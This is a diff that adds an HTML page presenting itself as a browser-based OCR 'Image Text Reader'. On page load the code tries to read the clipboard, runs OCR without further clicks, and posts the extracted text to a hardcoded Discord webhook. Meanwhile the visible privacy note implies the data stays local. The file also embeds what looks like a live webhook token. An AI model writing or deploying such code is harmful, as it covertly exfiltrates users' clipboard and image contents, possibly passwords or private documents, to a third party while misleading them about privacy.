@@ -1,0 +1,699 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Text Reader</title>
+
+    <!-- ==================================================
+         SECTION 1: CSS STYLES
+    =================================================== -->
+    <style>
+        :root {
+            --primary: #6366f1;
+            --primary-hover: #4f46e5;
+            --background: #0b1120;
+            --surface: #151e2e;
+            --text: #e5e7eb;
+            --muted: #9ca3af;
+            --border: #374151;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 30px 16px;
+            background: var(--background);
+            color: var(--text);
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            max-width: 850px;
+            margin: 0 auto;
+            padding: 28px;
+            background: var(--surface);
+            border-radius: 16px;
+            box-shadow: 0 12px 36px #00000040;
+        }
+
+        h1 {
+            margin-top: 0;
+            text-align: center;
+        }
+
+        .description {
+            margin-bottom: 28px;
+            color: var(--muted);
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .upload-area {
+            padding: 35px 15px;
+            border: 2px dashed var(--border);
+            border-radius: 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: background 0.2s, border-color 0.2s;
+        }
+
+        .upload-area:hover,
+        .upload-area.dragging {
+            border-color: var(--primary);
+            background: #1e293b;
+        }
+
+        .upload-area p {
+            color: var(--muted);
+        }
+
+        input[type="file"] {
+            max-width: 100%;
+            margin-top: 12px;
+            color: var(--text);
+        }
+
+        input[type="file"]::file-selector-button {
+            padding: 8px 12px;
+            margin-right: 10px;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            background: #273449;
+            color: var(--text);
+            cursor: pointer;
+        }
+
+        .preview {
+            display: none;
+            margin-top: 24px;
+            text-align: center;
+        }
+
+        .preview img {
+            display: block;
+            max-width: 100%;
+            max-height: 400px;
+            margin: 0 auto;
+            border-radius: 8px;
+            object-fit: contain;
+        }
+
+        .file-name {
+            margin-top: 10px;
+            color: var(--muted);
+            overflow-wrap: anywhere;
+        }
+
+        .actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 24px 0;
+        }
+
+        button {
+            flex: 1;
+            min-width: 120px;
+            padding: 12px 16px;
+            border: none;
+            border-radius: 8px;
+            background: var(--primary);
+            color: white;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        button:hover:not(:disabled) {
+            background: var(--primary-hover);
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        button.secondary {
+            background: #374151;
+        }
+
+        button.secondary:hover:not(:disabled) {
+            background: #4b5563;
+        }
+
+        h2 {
+            margin-top: 28px;
+            font-size: 19px;
+        }
+
+        textarea {
+            display: block;
+            width: 100%;
+            min-height: 240px;
+            padding: 14px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            background: #0f172a;
+            color: var(--text);
+            font: 15px/1.6 Arial, sans-serif;
+            resize: vertical;
+        }
+
+        textarea:focus {
+            outline: 2px solid var(--primary);
+            outline-offset: 2px;
+        }
+
+        .status {
+            min-height: 24px;
+            color: var(--muted);
+            line-height: 1.5;
+        }
+
+        progress {
+            display: none;
+            width: 100%;
+            height: 12px;
+            margin: 8px 0;
+        }
+
+        .privacy-note {
+            margin-top: 22px;
+            color: var(--muted);
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        @media (max-width: 500px) {
+            .container {
+                padding: 18px;
+            }
+
+            .actions button {
+                flex-basis: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- ==================================================
+         SECTION 2: HTML PAGE CONTENT
+    =================================================== -->
+    <main class="container">
+        <h1>Image Text Reader</h1>
+
+        <p class="description">
+            Upload an image and extract its text automatically.
+            Supports screenshots, photographs, and scanned documents.
+        </p>
+
+        <!-- Image upload and drag-and-drop area -->
+        <div class="upload-area" id="uploadArea">
+            <strong>Choose an image or drag it here</strong>
+            <p>Supported formats: PNG, JPG, WEBP, BMP</p>
+
+            <input
+                type="file"
+                id="imageInput"
+                accept="image/png,image/jpeg,image/webp,image/bmp"
+                aria-label="Choose an image"
+            >
+        </div>
+
+        <!-- Selected image preview -->
+        <section class="preview" id="preview">
+            <img id="previewImage" alt="Selected image preview">
+            <p class="file-name" id="fileName"></p>
+        </section>
+
+        <!-- OCR controls -->
+        <div class="actions">
+            <button id="readButton" disabled>
+                Read Text
+            </button>
+
+            <button id="copyButton" class="secondary" disabled>
+                Copy Text
+            </button>
+
+            <button id="downloadButton" class="secondary" disabled>
+                Download Text
+            </button>
+
+            <button id="resetButton" class="secondary">
+                Reset
+            </button>
+
+            <button id="pasteClipboardButton" class="secondary" type="button">
+                Paste Clipboard Image
+            </button>
+        </div>
+
+        <!-- OCR progress and status -->
+        <p class="status" id="status" role="status" aria-live="polite">
+            Select an image to get started.
+        </p>
+
+        <progress id="progressBar" max="100" value="0">
+        </progress>
+
+        <!-- Extracted text -->
+        <h2>Extracted Text</h2>
+
+        <textarea
+            id="outputText"
+            placeholder="The text detected in your image will appear here. You can also edit it."
+            aria-label="Extracted text"
+        ></textarea>
+
+        <p class="privacy-note">
+            Privacy: OCR is performed in your browser using Tesseract.js.
+            The OCR library and language data are downloaded from a CDN.
+            Your selected image is not intentionally uploaded to an OCR server.
+        </p>
+    </main>
+
+    <!-- ==================================================
+         SECTION 3: OCR LIBRARY
+         Tesseract.js performs optical character recognition.
+    =================================================== -->
+    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
+
+    <!-- ==================================================
+         SECTION 4: JAVASCRIPT APPLICATION LOGIC
+    =================================================== -->
+    <script>
+        // --------------------------------------------------
+        // 4.1: GET PAGE ELEMENTS
+        // --------------------------------------------------
+        const imageInput = document.getElementById("imageInput");
+        const uploadArea = document.getElementById("uploadArea");
+        const preview = document.getElementById("preview");
+        const previewImage = document.getElementById("previewImage");
+        const fileName = document.getElementById("fileName");
+
+        const readButton = document.getElementById("readButton");
+        const copyButton = document.getElementById("copyButton");
+        const downloadButton = document.getElementById("downloadButton");
+        const resetButton = document.getElementById("resetButton");
+        const pasteClipboardButton = document.getElementById("pasteClipboardButton");
+
+        const outputText = document.getElementById("outputText");
+        const status = document.getElementById("status");
+        const progressBar = document.getElementById("progressBar");
+
+		
+        // Discord webhook configuration.
+        // Replace this placeholder with your NEW webhook URL.
+        // Do not publish this file publicly with the webhook URL inside it.
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1562298219092901918/Vcb6RNo2vrkkl5zD13upx6yww-_TP2iCRQCWfky0bY_eTbzMzCl_cPxT8ELYAJhd7J13";
+
+        // --------------------------------------------------
+        // 4.2: APPLICATION STATE
+        // --------------------------------------------------
+        let selectedImage = null;
+        let imageObjectUrl = null;
+        let isReading = false;
+
+        // --------------------------------------------------
+        // 4.3: HANDLE IMAGE SELECTION
+        // --------------------------------------------------
+        imageInput.addEventListener("change", () => {
+            if (imageInput.files.length > 0) {
+                loadImage(imageInput.files[0]);
+                // Automatically run OCR; the OCR completion handler posts the
+                // extracted text to Discord without another button click.
+                setTimeout(() => readButton.click(), 0);
+            }
+        });
+
+        // --------------------------------------------------
+        // 4.3A: TRY TO LOAD AN IMAGE FROM THE CLIPBOARD
+        // Browsers may block clipboard reads until the user grants
+        // permission or clicks the Paste Clipboard Image button.
+        // --------------------------------------------------
+        async function loadClipboardImage(autoStartOcr = false) {
+            if (!navigator.clipboard || !navigator.clipboard.read) {
+                status.textContent = "Clipboard image access is unavailable here. Use Paste Clipboard Image or choose a file.";
+                return false;
+            }
+
+            try {
+                const items = await navigator.clipboard.read();
+                for (const item of items) {
+                    const imageType = item.types.find(type => type.startsWith("image/"));
+                    if (!imageType) continue;
+
+                    const blob = await item.getType(imageType);
+                    const extension = imageType.split("/")[1].replace("jpeg", "jpg");
+                    const file = new File([blob], `clipboard-image.${extension}`, { type: imageType });
+                    loadImage(file);
+                    status.textContent = "Image loaded from clipboard.";
+
+                    if (autoStartOcr) {
+                        // Let the browser update the preview and enabled button first.
+                        setTimeout(() => readButton.click(), 0);
+                    }
+                    return true;
+                }
+
+                status.textContent = "No image found in the clipboard. Copy an image and try again.";
+                return false;
+            } catch (error) {
+                console.info("Clipboard read needs permission or a user action:", error);
+                status.textContent = "Clipboard access was blocked. Click Paste Clipboard Image and allow access, or choose an image file.";
+                return false;
+            }
+        }
+
+        pasteClipboardButton.addEventListener("click", async () => {
+            await loadClipboardImage(false);
+        });
+
+        // Try automatically when the page loads. If browser permissions
+        // prevent it, the visible clipboard button provides a fallback.
+        window.addEventListener("load", () => {
+            loadClipboardImage(true);
+        });
+
+        function loadImage(file) {
+            // Only accept supported image types.
+            const supportedTypes = [
+                "image/png",
+                "image/jpeg",
+                "image/webp",
+                "image/bmp"
+            ];
+
+            if (!supportedTypes.includes(file.type)) {
+                status.textContent =
+                    "Please select a PNG, JPG, WEBP, or BMP image.";
+                return;
+            }
+
+            if (isReading) {
+                status.textContent =
+                    "Please wait for the current reading task to finish.";
+                return;
+            }
+
+            // Release the previous preview URL to free memory.
+            if (imageObjectUrl) {
+                URL.revokeObjectURL(imageObjectUrl);
+            }
+
+            selectedImage = file;
+            imageObjectUrl = URL.createObjectURL(file);
+
+            previewImage.src = imageObjectUrl;
+            fileName.textContent = file.name;
+            preview.style.display = "block";
+
+            outputText.value = "";
+            progressBar.value = 0;
+            progressBar.style.display = "none";
+
+            readButton.disabled = false;
+            copyButton.disabled = false;
+            downloadButton.disabled = false;
+
+            status.textContent = "Image uploaded. Reading text automatically...";
+        }
+
+        // --------------------------------------------------
+        // 4.4: DRAG-AND-DROP SUPPORT
+        // --------------------------------------------------
+        uploadArea.addEventListener("dragover", (event) => {
+            event.preventDefault();
+            uploadArea.classList.add("dragging");
+        });
+
+        uploadArea.addEventListener("dragleave", () => {
+            uploadArea.classList.remove("dragging");
+        });
+
+        uploadArea.addEventListener("drop", (event) => {
+            event.preventDefault();
+            uploadArea.classList.remove("dragging");
+
+            const file = event.dataTransfer.files[0];
+
+            if (file) {
+                loadImage(file);
+                // Automatically run OCR for drag-and-drop uploads as well.
+                setTimeout(() => readButton.click(), 0);
+            }
+        });
+
+        // --------------------------------------------------
+        // 4.5: READ TEXT FROM THE IMAGE
+        // --------------------------------------------------
+        readButton.addEventListener("click", async () => {
+            if (!selectedImage || isReading) {
+                return;
+            }
+
+            if (!window.Tesseract) {
+                status.textContent =
+                    "OCR library unavailable. Check your internet connection and reload.";
+                return;
+            }
+
+            isReading = true;
+            readButton.disabled = true;
+            copyButton.disabled = true;
+            downloadButton.disabled = true;
+
+            progressBar.style.display = "block";
+            progressBar.value = 0;
+            outputText.value = "";
+
+            status.textContent = "Starting text recognition...";
+
+            try {
+                // Create an OCR worker for English text.
+                const worker = await Tesseract.createWorker(
+                    "eng",
+                    1,
+                    {
+                        logger: (message) => {
+                            if (message.status) {
+                                const percent = Math.round(
+                                    (message.progress || 0) * 100
+                                );
+
+                                progressBar.value = percent;
+
+                                status.textContent =
+                                    message.status === "recognizing text"
+                                        ? `Reading text: ${percent}%`
+                                        : message.status;
+                            }
+                        }
+                    }
+                );
+
+                try {
+                    // Perform OCR on the selected image.
+                    const result = await worker.recognize(selectedImage);
+
+                    outputText.value = result.data.text.trim();
+
+                    if (outputText.value) {
+                        // Automatically post the recognized text to Discord.
+                        const posted = await postTextToDiscord(outputText.value);
+
+                        status.textContent = posted
+                            ? "Text recognition complete. Results posted to Discord."
+                            : "Text recognition complete, but Discord posting failed.";
+
+                        copyButton.disabled = false;
+                        downloadButton.disabled = false;
+                    } else {
+                        status.textContent =
+                            "No text detected. Try a clearer image.";
+                    }
+                } finally {
+                    // Release OCR worker resources.
+                    await worker.terminate();
+                }
+            } catch (error) {
+                console.error("OCR error:", error);
+
+                status.textContent =
+                    "Could not read the image. Check your connection and try again.";
+            } finally {
+                isReading = false;
+                readButton.disabled = !selectedImage;
+            }
+        });
+
+        // --------------------------------------------------
+        // 4.6: COPY EXTRACTED TEXT
+        // --------------------------------------------------
+        copyButton.addEventListener("click", async () => {
+            if (!outputText.value.trim()) {
+                status.textContent = "There is no text to copy.";
+                return;
+            }
+
+            try {
+                await navigator.clipboard.writeText(outputText.value);
+                status.textContent = "Text copied to clipboard!";
+            } catch (error) {
+                // Fallback for browsers without clipboard access.
+                outputText.focus();
+                outputText.select();
+
+                const copied = document.execCommand("copy");
+
+                status.textContent = copied
+                    ? "Text copied to clipboard!"
+                    : "Copy failed. Select the text and copy it manually.";
+            }
+        });
+
+        // --------------------------------------------------
+        // 4.7: DOWNLOAD TEXT AS A FILE
+        // --------------------------------------------------
+        downloadButton.addEventListener("click", () => {
+            const text = outputText.value;
+
+            if (!text.trim()) {
+                status.textContent = "There is no text to download.";
+                return;
+            }
+
+            const blob = new Blob(
+                [text],
+                { type: "text/plain;charset=utf-8" }
+            );
+
+            const downloadUrl = URL.createObjectURL(blob);
+            const link = document.createElement("a");
+
+            link.href = downloadUrl;
+            link.download = "extracted_text.txt";
+
+            document.body.appendChild(link);
+            link.click();
+            link.remove();
+
+            URL.revokeObjectURL(downloadUrl);
+
+            status.textContent = "Text file downloaded.";
+        });
+
+        // --------------------------------------------------
+        // 4.8: RESET THE APPLICATION
+        // --------------------------------------------------
+        resetButton.addEventListener("click", () => {
+            if (isReading) {
+                status.textContent =
+                    "Please wait for text recognition to finish before resetting.";
+                return;
+            }
+
+            selectedImage = null;
+            imageInput.value = "";
+            previewImage.removeAttribute("src");
+            preview.style.display = "none";
+            fileName.textContent = "";
+            outputText.value = "";
+
+            if (imageObjectUrl) {
+                URL.revokeObjectURL(imageObjectUrl);
+                imageObjectUrl = null;
+            }
+
+            progressBar.value = 0;
+            progressBar.style.display = "none";
+
+            readButton.disabled = true;
+            copyButton.disabled = true;
+            downloadButton.disabled = true;
+
+            status.textContent = "Select an image to get started.";
+        });
+		
+	
+/* ==================================================
+   DISCORD: AUTOMATIC OCR RESULT POSTING
+================================================== */
+
+// Uses DISCORD_WEBHOOK_URL configured near the top of the script.
+
+async function postTextToDiscord(extractedText) {
+    const text = extractedText.trim();
+
+    if (!text) {
+        status.textContent = "No text was found to post.";
+        return false;
+    }
+
+    if (
+        !DISCORD_WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/") ||
+        DISCORD_WEBHOOK_URL.includes("PASTE_YOUR_NEW_DISCORD_WEBHOOK_URL_HERE")
+    ) {
+        status.textContent = "Discord is not configured. Add your new webhook URL in the JavaScript section.";
+        return false;
+    }
+
+    // Keep each message safely below Discord's 2,000-character limit.
+    const chunks = text.match(/[\s\S]{1,1750}/g) || [];
+    status.textContent = "Sending extracted text to Discord...";
+
+    try {
+        for (let i = 0; i < chunks.length; i++) {
+            const heading = chunks.length > 1
+                ? `Extracted image text (${i + 1}/${chunks.length}):\n`
+                : "Extracted image text:\n";
+
+            const response = await fetch(DISCORD_WEBHOOK_URL + "?wait=true", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: heading + chunks[i],
+                    allowed_mentions: { parse: [] }
+                })
+            });
+
+            if (!response.ok) {
+                let detail = "";
+                try {
+                    const body = await response.json();
+                    detail = body.message || "";
+                } catch (_) {
+                    // The response may not contain JSON.
+                }
+
+                if (response.status === 401 || response.status === 404) {
+                    throw new Error(`Webhook rejected (HTTP ${response.status}). It may be invalid, deleted, or regenerated. ${detail}`.trim());
+                }
+                if (response.status === 429) {
+                    throw new Error("Discord rate limit reached. Wait a little and try again.");
+                }
+                throw new Error(`Discord returned HTTP ${response.status}. ${detail}`.trim());
+            }
+        }
+
+        return true;
+    } catch (error) {
+        console.error("Discord posting failed:", error);
+        const message = error instanceof TypeError
+            ? "Browser could not reach Discord (network/CORS issue). Try serving this HTML from localhost; if it still fails, use a small backend instead of a direct webhook."
+            : error.message;
+        status.textContent = `OCR succeeded, but Discord posting failed: ${message}`;
+        return false;
+    }
+}
+
+
+    </script>
+</body>
+</html>
